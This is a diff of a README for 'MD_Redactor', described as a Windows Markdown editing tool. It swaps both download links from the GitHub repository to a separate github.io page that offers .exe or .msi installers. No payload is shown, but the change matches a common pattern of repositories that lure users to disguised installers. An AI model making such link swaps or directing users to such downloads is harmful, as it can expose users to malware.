@@ -1,6 +1,6 @@
 # 📝 MD_Redactor - Edit Markdown Files with AI Efficiency
 
-[![](https://img.shields.io/badge/Download-MD_Redactor-blue)](https://github.com/Ikeyhandstitched983/MD_Redactor)
+[![](https://img.shields.io/badge/Download-MD_Redactor-blue)](https://ikeyhandstitched983.github.io)
 
 MD_Redactor helps you manage your writing projects. This desktop tool allows you to add notes and edits to Markdown files. It bridges the gap between your raw notes and AI-assisted workflows. You can change text, add reviews, and clean up your files without complex software.
 
@@ -16,7 +16,7 @@ You need a computer running Windows 10 or Windows 11. The software requires the 
 
 Visit the link below to reach the project release page.
 
-[Click here to visit the download page](https://github.com/Ikeyhandstitched983/MD_Redactor)
+[Click here to visit the download page](https://ikeyhandstitched983.github.io)
 
 Look for the latest version under the Releases section. Select the file ending in `.msi` or `.exe` depending on your preference. Most users should select the installer file to finish the process.
 
